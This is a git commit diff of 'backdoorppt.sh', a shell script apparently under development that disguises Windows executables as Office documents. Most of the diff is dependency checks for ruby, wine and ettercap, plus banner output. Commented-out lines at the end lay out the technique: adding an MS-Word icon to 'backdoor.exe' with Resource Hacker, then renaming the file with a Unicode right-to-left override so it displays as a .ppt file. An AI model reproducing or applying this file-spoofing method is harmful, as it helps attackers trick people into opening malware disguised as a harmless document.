e5f7d39116fe60340f367f3154836e97cc207cd3
root <root@localhost.localdomain>
2017-01-10 12:41:10 +0000

    checking backend applications

--- backdoorppt.sh
+++ backdoorppt.sh
@@ -1,5 +1,8 @@
 #!/bin/sh
 
+
+
+
 # -----------------------------------
 # Colorise shell Script output leters
 # -----------------------------------
@@ -15,34 +18,98 @@ Reset="${Escape}[0m";
 }
 
 
-#
-# progress bar funtion
-#
+
+# banner
+cat << !
+
+    +-+-+-+-+-+-+-+-+-+-+-+
+    |b|a|c|k|d|o|o|r|p|p|t|
+    +-+-+-+-+-+-+-+-+-+-+-+
+ 'A binary transformation tool'
+ Credits: Damon Mohammadbagher
+
+!
+
+
 Colors;
-sleep 2.5 & PID=$! #simulate a long process
-
-echo "${BlueF}[☆]${white} Please wait, searching for dependencies.${BlueF}"
-printf "["
-# While process is running...
-while kill -0 $PID 2> /dev/null; do 
-    printf  "#"
-    sleep 0.1
-done
-printf "] done!"
+echo ${BlueF}[☆]${YellowF} Please wait, checking backend applications! ${Reset};
+sleep 1
+# ----------------------
+# check for dependencies
+# ----------------------
+apc=`which ruby`
+if [ "$?" != "0" ]; then
 echo ""
-sleep 2 && clear
+echo ${RedF}[☠]${white} Ruby installation '->' ${RedF}not found! ${Reset};
+echo ${RedF}[☠]${white} This script requires ruby to work! ${Reset};
+sleep 1
+exit
+else
+echo ${BlueF}[☆]${white} Ruby installation  '->' ${GreenF}found! ${Reset};
+sleep 1
+fi
 
+apc=`which wine`
+if [ "$?" != "0" ]; then
+echo ""
+echo ${RedF}[☠]${white} wine installation '->' ${RedF}not found! ${Reset};
+sleep 1
+echo ${RedF}[☠]${white} This script requires wine to work! ${Reset};
+echo ${RedF}[☠]${white} Please run: sudo apt-get install wine ${Reset};
+echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
+exit
+else
+echo ${BlueF}[☆]${white} wine installation  '->' ${GreenF}found! ${Reset};
+sleep 1
+fi
+
+if [ -e "/root/.wine/drive_c/Program Files" ]; then
+echo ${BlueF}[☆]${white} Wine Program Files '->' ${GreenF}found! ${Reset};
+sleep 1
+else
+echo ${RedF}[☠]${white} Wine Program Files '->' ${RedF}not found! ${Reset};
+sleep 1
+echo ${RedF}[☠]${white} Please wait, running winecfg! ${Reset};
+winecfg > /dev/null 2>&1
+sleep 1
+exit
+fi
 
 apc=`which ettercap`
 if [ "$?" != "0" ]; then
 echo ""
-echo ${RedF}[☠]${white} ettercap '->' not found! ${Reset};
+echo ${RedF}[☠]${white} ettercap installation '->' ${RedF}not found! ${Reset};
 sleep 1
 echo ${RedF}[☠]${white} This script requires ettercap to work! ${Reset};
 echo ${RedF}[☠]${white} Please run: sudo apt-get install ettercap ${Reset};
 echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
 exit
 else
-echo ${BlueF}[☆]${white} Ettercap installation, found... ${Reset};
-echo ""
+echo ${BlueF}[☆]${white} Ettercap installation '->' ${GreenF}found! ${Reset};
+sleep 1
 fi
+
+
+
+read OP
+# ------------------------
+# start of script funtions
+# ------------------------
+clear
+echo ""
+echo ${BlueF}[☆]${white} Please 'select' [${GreenF}windows 7${white}] OS${Reset};
+# winecfg > /dev/null 2>&1
+
+
+# wine command to call resourcehacker and add a MS-WORD.ico to the backdoor
+# wine /root/.wine/drive_c/"Program Files"/"Resource Hacker"/ResourceHacker.exe -open /root/putty.exe -save /root/backdoor.exe -action addskip -res /root/MS-Word-32x32.ico -mask ICONGROUP,MAINICON,
+
+# insert .ppt hidden extension
+# mv backdoor.exe  backdoor_ppt.exe
+
+# rename backdoor name
+# ruby -e 'File.rename("backdoor_ppt.exe", "resume\xe2\x80\xaetpp.exe")'
+
+
+
+
